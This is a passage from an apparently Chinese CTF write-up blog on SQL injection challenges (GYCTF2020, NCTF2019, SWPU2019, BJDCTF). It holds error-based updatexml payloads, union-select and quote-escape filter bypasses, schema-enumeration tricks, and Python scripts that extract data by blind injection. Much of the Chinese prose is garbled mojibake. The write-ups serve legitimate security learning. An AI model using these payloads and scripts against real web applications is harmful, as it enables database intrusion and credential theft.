<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zz&quot;||updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p><del>web_sqli</del></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;web_sqli&#39;)),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p><del>article,flag,users</del></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1)#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>~name,pwd,email,real_flag_1s_her</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;|(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>â€˜~ereh_s1_galf_laer,liame,dwp,emaâ€™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>â€˜~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxxâ€™</p>
<p>å°è¯•reverse</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,reverse(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e)),1))#</span><br></pre></td></tr></table></figure>
<p>â€˜~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxxâ€™</p>
<p>ä½¿ç”¨regexpè¿›è¡Œæ­£åˆ™åŒ¹é…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>â€˜~flag{8ab20865-f566-4f30-a861-10â€™</p>
<p>reverseä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;zzz&quot;||(updatexml(1,reverse(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e)),1))#&amp;password&#x3D;2&amp;email&#x3D;2</span><br></pre></td></tr></table></figure>
<p>â€˜~}5cdb11ddaa01-168a-03f4-665f-56â€™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8ab20865-f566-4f30-a861-10aadd11bdc5&#125;</span><br></pre></td></tr></table></figure>




<h1 id="EzSqli"><a href="#EzSqli" class="headerlink" title="EzSqli"></a>EzSqli</h1><p>æ¥æºï¼šGYCTF2020</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</a></p>
<p>å¯»æ‰¾ç‚¹ï¼Œå‘ç°ifå…¶å®æ²¡æœ‰è¢«è¿‡æ»¤ï¼ˆä½†æ˜¯å¾ˆå¤šwpè¯´è¢«è¿‡æ»¤äº†ï¼Œåæ¥ç»æŸ¥è¯ï¼Œå­—ç¬¦å¤šäº†æ‰ä¼šè¢«è¿‡æ»¤2333ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;if(1&#x3D;1,1,2)</span><br><span class="line">Nu1L</span><br><span class="line">id&#x3D;if(1&#x3D;2,1,2)</span><br><span class="line"># V&amp;N</span><br><span class="line">id&#x3D;if(1&#x3D;1,3,2)</span><br><span class="line"># Error Occured When Fetch Result.</span><br></pre></td></tr></table></figure>
<p>æŠ¥é”™æ³¨å…¥å¾—åˆ°æ•°æ®åº“å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">give_grandpa_pa7pa_pa</span><br></pre></td></tr></table></figure>
<p>å°è¯•ä½¿ç”¨information_schemaè·å¾—è¡¨åï¼Œæ— æ•ˆ</p>
<p>æ ¹æ®wpï¼Œä½¿ç”¨sys.x$schema_flattened_keys</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x3D; &#39;select group_concat(table_name) from sys.x$schema_flattened_keys&#39;</span><br></pre></td></tr></table></figure>
<p>æˆ–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°è¡¨å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users23333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ä½¿ç”¨äº†å­—ç¬¦ä¸²å¤§å°çš„åˆ¤æ–­æ¥ç¼–å†™æŠ¥é”™è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;8ec28565-2e76-4246-ba91-4641f78374a6.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">text &#x3D; &quot;V&amp;N&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">payload2 &#x3D; &quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br><span class="line">payload3 &#x3D; &quot;(select 1,&#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;</span><br><span class="line">for i in range(1, 600):</span><br><span class="line">	# print(&quot;debug&quot;)</span><br><span class="line">	low &#x3D; 32</span><br><span class="line">	high &#x3D; 128</span><br><span class="line">	while low &lt; high:</span><br><span class="line">		mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line">		# print(c)</span><br><span class="line">		str_temp &#x3D; ans + chr(mid)</span><br><span class="line"></span><br><span class="line">		payload_temp &#x3D; payload3.format(str_temp)</span><br><span class="line">		post_data &#x3D;&#123;</span><br><span class="line">			&quot;id&quot;: &quot;2||(&#123;&#125;)&quot;.format(payload_temp)</span><br><span class="line">		&#125;</span><br><span class="line">		response &#x3D; requests.post(url, data &#x3D; post_data)</span><br><span class="line">		print(response.text)</span><br><span class="line">		print(mid)</span><br><span class="line">		if text not in response.text:</span><br><span class="line">			high &#x3D; mid</span><br><span class="line">		else:</span><br><span class="line">			low &#x3D; mid + 1</span><br><span class="line">	if low &#x3D;&#x3D; 32 or high &#x3D;&#x3D; 128:</span><br><span class="line">		break</span><br><span class="line">	ans &#x3D; ans + chr(low - 1)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;9771B2DF-3F20-4E74-A4C6-B73CE4C9DEB9&#125; </span><br></pre></td></tr></table></figure>
<p>ç¯å¢ƒå¥½åƒæœ‰äº›é—®é¢˜ï¼Œæäº¤ä¸èƒ½é€šè¿‡ã€‚</p>
<h2 id="ä¸ä½¿ç”¨information-schemaè·å¾—è¡¨åçš„æ–¹æ³•"><a href="#ä¸ä½¿ç”¨information-schemaè·å¾—è¡¨åçš„æ–¹æ³•" class="headerlink" title="ä¸ä½¿ç”¨information_schemaè·å¾—è¡¨åçš„æ–¹æ³•"></a>ä¸ä½¿ç”¨information_schemaè·å¾—è¡¨åçš„æ–¹æ³•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()</span><br><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<h2 id="æŠ¥é”™æ³¨å…¥ï¼ˆæ— ifç‰ˆæœ¬ï¼‰"><a href="#æŠ¥é”™æ³¨å…¥ï¼ˆæ— ifç‰ˆæœ¬ï¼‰" class="headerlink" title="æŠ¥é”™æ³¨å…¥ï¼ˆæ— ifç‰ˆæœ¬ï¼‰"></a>æŠ¥é”™æ³¨å…¥ï¼ˆæ— ifç‰ˆæœ¬ï¼‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select &#39;&#123;&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
<p>ä¼šæŒ‰ç…§å­—ç¬¦ä¸²å¤§å°æ¥è®¡ç®—</p>
<h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>æ¥æºï¼šNCTF2019</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/nctf2019sqliregexp-zhu/">https://guokeya.github.io/post/nctf2019sqliregexp-zhu/</a></p>
<p>é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œæ˜¯ä¸€ä¸ªç™»å½•æ¡†</p>
<p>fuzzä¸€ä¸‹ï¼Œå‘ç°ç»å¤§å¤šæ•°çš„å…³é”®å­—éƒ½è¿‡æ»¤äº†</p>
<p>æ­¤å¤„è¿˜å¯ä»¥è®¿é—®robots.txtï¼Œè¿›è€Œè®¿é—®hint.txtï¼Œå¾—åˆ°è¿‡æ»¤é»‘åå•</p>
<p>æ ¹æ®wpï¼Œregexpæ²¡è¿‡æ»¤ï¼Œæ•…å¯æ„é€ åŸºäºregexpçš„æŠ¥é”™æ³¨å…¥è¯­å¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://ee06d8fc-6daa-4c18-ba05-ac4293161510.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">string = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+string.digits</span><br><span class="line">text = <span class="string">&quot;welcome.php&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">	<span class="comment"># print(&quot;debug&quot;)</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	high = <span class="number">128</span></span><br><span class="line">	flag = <span class="literal">False</span></span><br><span class="line">	<span class="comment"># for j in range(low, high):</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">		<span class="comment"># print(c)</span></span><br><span class="line">		<span class="comment"># time.sleep(0.5)</span></span><br><span class="line">		str_temp = ans + j</span><br><span class="line">		post_data =&#123;</span><br><span class="line">			<span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">			<span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(str_temp,parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">		&#125;</span><br><span class="line">		response = requests.post(url, data = post_data)</span><br><span class="line">		<span class="comment"># print(response.text)</span></span><br><span class="line">		<span class="keyword">if</span> text <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="comment"># print(response.text)</span></span><br><span class="line">			ans = str_temp</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">			print(ans)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><strong>è§£é‡Š</strong></p>
<p>å…¶ä¸­ï¼Œå…³é”®è¯­å¥ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &quot;\\&quot;,</span><br><span class="line">&quot;passwd&quot;: &#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;;&#123;&#125;&#39;.format(str_temp,parse.unquote(&#39;%00&#39;))</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºå¯¹å•å¼•å·è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥usernameå¤„æ·»åŠ \ï¼Œå°†å…¶åçš„å•å¼•å·è¿‡æ»¤ã€‚ä¸”è€ƒè™‘åˆ°è½¬è¯‘çš„åŸå› ï¼Œä¸ºâ€\\â€œ</p>
<p>è€Œpasswdç”¨åˆ°äº†ä¸‰ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªæ˜¯sqlçš„å†…è”æ³¨é‡Š/**/å¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼Œä¸€ä¸ªæ˜¯regexpçš„å¸ƒå°”ç›²æ³¨ï¼Œä¸€ä¸ªæ˜¯phpä¸­%00çš„æˆªæ–­ï¼ˆæ­¤å¤„pythonçš„æ—¶å€™ä¸èƒ½ç›´æ¥ä¼ å…¥ï¼Œä¼šè¢«è§£ç ä¸ºç©ºï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() regexp &#39;^r&#39; # ä»user()ä¸­åˆ¤æ–­æ˜¯å¦æœ‰ä»¥rå­—æ¯å¼€å¤´çš„å€¼ï¼Œæœ‰çš„è¯è¿”å›1</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­—ç¬¦åªèƒ½ä»_ã€æ•°å­—ã€å¤§å°å†™å­—æ¯ä¸­é€‰å–ï¼Œè¦æ˜¯ç›´æ¥ä»¥asciiç é€‰å–ï¼Œä¼šé€‰åˆ°*ï¼Œç„¶åæŠ¥é”™</p>
<p>å¾—åˆ°å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you_will_never_Know7788990</span><br></pre></td></tr></table></figure>
<p>å°†å…¶è½¬æ¢ä¸ºå°å†™ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ï¼Œæäº¤åå¾—åˆ°flag</p>
<h2 id="regexpå¸ƒå°”ç›²æ³¨"><a href="#regexpå¸ƒå°”ç›²æ³¨" class="headerlink" title="regexpå¸ƒå°”ç›²æ³¨"></a>regexpå¸ƒå°”ç›²æ³¨</h2><p>select user() regexp â€˜^râ€™ # ä»user()ä¸­åˆ¤æ–­æ˜¯å¦æœ‰ä»¥rå­—æ¯å¼€å¤´çš„å€¼ï¼Œæœ‰çš„è¯è¿”å›1</p>
<h2 id="å•å¼•å·æ³¨å…¥ç»•è¿‡"><a href="#å•å¼•å·æ³¨å…¥ç»•è¿‡" class="headerlink" title="å•å¼•å·æ³¨å…¥ç»•è¿‡"></a>å•å¼•å·æ³¨å…¥ç»•è¿‡</h2><p>ä½¿ç”¨\</p>
<h2 id="phpæˆªæ–­"><a href="#phpæˆªæ–­" class="headerlink" title="phpæˆªæ–­"></a>phpæˆªæ–­</h2><p>%00</p>
<p>æœ‰ç‰ˆæœ¬é™åˆ¶</p>
<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p>æ¥æºï¼šSWPU2019</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43900387/article/details/103534108">https://blog.csdn.net/weixin_43900387/article/details/103534108</a></p>
<p>è€ƒå¯Ÿï¼šmysql.innodb_table_statsï¼Œå†…è”æ³¨é‡Šç»•è¿‡ç©ºæ ¼</p>
<p>è¿›å…¥é¡µé¢ï¼Œæœ‰æ³¨å†Œé¡µé¢å’Œç™»å½•é¡µé¢</p>
<p>åœ¨æ³¨å†Œé¡µé¢å¤„å°è¯•è¿›è¡Œupdatexmlçš„æŠ¥é”™æ³¨å…¥ï¼Œç”±äºå›æ˜¾åªæœ‰ç™»å½•æ—¶æ‰ä¼šå‡ºç°â€œç™»å½•å¤±è´¥â€ï¼ŒæŠ¥é”™æ³¨å…¥è¾ƒä¸ºå¤æ‚ã€‚å°è¯•å¤šæ¬¡åï¼Œå¤±è´¥ã€‚</p>
<p>éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œè¿›å…¥é¡µé¢åï¼Œæœ‰ä¸€ä¸ªè¾“å…¥ç•™è¨€çš„ä½ç½®</p>
<p>å°è¯•åœ¨æ ‡é¢˜å’Œå†…å®¹éƒ½è¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;database()</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸã€‚</p>
<p>ç‚¹å‡»æŸ¥çœ‹ç•™è¨€ï¼Œå‘ç°ç°å®sqlè¯­å¥é”™è¯¯ï¼Œè¯´æ˜æ ‡é¢˜è¡Œæ˜¯æœ‰æ³¨å…¥ç‚¹çš„</p>
<p>éº»çƒ¦çš„æ˜¯æ­¤å¤„ç”¨burpè·‘fuzzæ¯”è¾ƒéº»çƒ¦ï¼Œä¸”è¿‡æ»¤äº†order byï¼Œè¡Œæ•°ç‰¹åˆ«å¤š</p>
<p>çœ‹wp</p>
<p>çˆ†åˆ—æ•°ï¼Œæ³¨æ„æœ€åä¸€ä¸ªæ•°22çš„å•å¼•å·ï¼Œç”¨äºé—­åˆå³å•å¼•å·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>æŠ¥æ•°æ®åº“ç±»å‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>æ˜¯mariaDB-logï¼Œå®ƒçš„mysql.innodb_tableå’Œmysqä¸­çš„information_table.schemaä½œç”¨ä¸€æ ·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°è¡¨åï¼Œç„¶åæŠ½å–è¡¨å€¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
<h2 id="ç»•è¿‡å•å¼•å·çš„æ–¹æ³•"><a href="#ç»•è¿‡å•å¼•å·çš„æ–¹æ³•" class="headerlink" title="ç»•è¿‡å•å¼•å·çš„æ–¹æ³•"></a>ç»•è¿‡å•å¼•å·çš„æ–¹æ³•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,&#39;22</span><br></pre></td></tr></table></figure>
<h2 id="maria-dbä¸‹çš„â€œinformation-schemaâ€"><a href="#maria-dbä¸‹çš„â€œinformation-schemaâ€" class="headerlink" title="maria_dbä¸‹çš„â€œinformation_schemaâ€"></a>maria_dbä¸‹çš„â€œinformation_schemaâ€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>


<h1 id="ç®€å•æ³¨å…¥"><a href="#ç®€å•æ³¨å…¥" class="headerlink" title="ç®€å•æ³¨å…¥"></a>ç®€å•æ³¨å…¥</h1><p>æ¥æºï¼šBJDCTF 2nd</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Fakebook">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#%E5%BC%BA%E7%BD%91%E6%9D%AF2019-Fakebook</a></p>
<p>è¿›å…¥é¡µé¢ï¼Œåªæœ‰ä¸€ä¸ªç™»å½•é¡µé¢</p>
<p>éšæ‰‹å°†URLæ¢æˆrobots.txtï¼Œæç¤ºè®¿é—®hint.txt</p>
<p>è®¿é—®hint.txtï¼Œæœ‰å¦‚ä¸‹æç¤º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;é‘æ´ªî•½æµœå“„æ´“ç»¾Ñƒå¸‡ç»¾æŒå¢ æ©ï¿½ ç‘™ä½½çš¡ç‘™ä½½çš¡ æ£°å—•ç´°ç»®å‰§îš£</span><br></pre></td></tr></table></figure>
<p>ä¹±ç éƒ¨åˆ†è½¬æ¢å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‡ºé¢˜äººå››çº§å‹çº¿æ‰? è§è°…è§è°… é¢†ä¼šç²¾ç¥</span><br></pre></td></tr></table></figure>
<p>ç»æµ‹è¯•ï¼Œå•å¼•å·è¢«wafæ‹¦æˆªï¼Œandè¢«wafæ‹¦æˆª</p>
<p>ä½¿ç”¨ç±»ä¼¼Web1çš„è½¬è¯‘å•å¼•å·ç»•è¿‡æ–¹æ³•å•Š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: 1\</span><br><span class="line">password: or&#x2F;**&#x2F;payload#</span><br></pre></td></tr></table></figure>
<p>åé¢ä¸åšäº†ï¼Œå°±å¥—æ¨¡æ¿ã€‚è¶…å‚è€ƒé“¾æ¥çš„wp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;c4a52ced-49ff-4797-b075-989df5c9ad7a.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;username&#39;: &#39;admin\\&#39;,</span><br><span class="line">    &#39;password&#39;: &#39;&#39;</span><br><span class="line">&#125;</span><br><span class="line">flag &#x3D; &#39;BJD needs to be stronger&#39;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">        payload &#x3D; &quot;or&#x2F;**&#x2F;if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line">        data[&#39;password&#39;] &#x3D; payload</span><br><span class="line"></span><br><span class="line">        rs &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">        if flag in rs.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line"></span><br><span class="line">    if low !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(low)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåœ¨ç™»å½•æ¡†ç”¨æˆ·åè¾“å…¥adminï¼Œå¯†ç è¾“å…¥è¯¥å­—ç¬¦ä¸²ï¼Œå¾—åˆ°flag</p>
<h1 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h1><p>å¾…åšï¼Œè€ƒçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå¤š</p>
<h1 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h1><p>æ¥æºï¼šCISCN2019</p>
